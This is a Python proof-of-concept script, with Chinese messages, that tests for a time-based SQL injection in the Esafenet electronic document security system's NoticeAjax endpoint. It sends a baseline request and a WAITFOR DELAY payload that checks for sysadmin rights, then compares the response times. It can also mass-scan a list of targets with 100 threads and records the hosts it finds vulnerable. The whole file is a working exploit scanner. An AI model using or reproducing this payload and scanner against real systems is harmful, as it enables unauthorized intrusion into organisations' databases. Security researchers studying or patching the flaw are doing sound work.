import argparse,requests,re,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def a():
    text="""
██████╗  ██████╗  ██████╗
██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║   ██║██║     
██╔═══╝ ██║   ██║██║     
██║     ╚██████╔╝╚██████╗
╚═╝      ╚═════╝  ╚═════╝
                                                         
"""
    print(text)

def poc(target):
    link="/CDGServer3/NoticeAjax;Service"
    payloade="command=delNotice&iceId=123"
    payloade1="command=delNotice&iceId=123';+if+(select+IS_SRVROLEMEMBER('sysadmin'))=1+WAITFOR+DELAY+'0:0:5'--"
    header={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
    }
    try:
        res = requests.post(url=target+link,headers=header,data=payloade,verify=False)
        # a=print(f"正常时间是：{res.elapsed.total_seconds()}")
        res1=requests.post(url=target+link,headers=header,data=payloade1,verify=False)
        # b=print(f"测试之后时间是：{res1.elapsed.total_seconds()}")
        if res1.elapsed.total_seconds()-res.elapsed.total_seconds()<=4 and res1.elapsed.total_seconds()>=5:
            print(f"[+]{target}存在SQL注入延时注入漏洞")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
        else :
            print(f"[-]{target}不存在漏洞")
    except:
        pass



def main():
    a()
    parse=argparse.ArgumentParser(description="亿赛通电子文档安全管理系统NoticeAjax接口存在SQL注入漏洞")
    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                urllist.append(i.strip())
        mp=Pool(100)
        mp.map(poc,urllist)
        mp.close
        mp.join
    else:
        print(f"Usage : Python {sys.argv[0]} -h") 

if __name__=="__main__":
    main()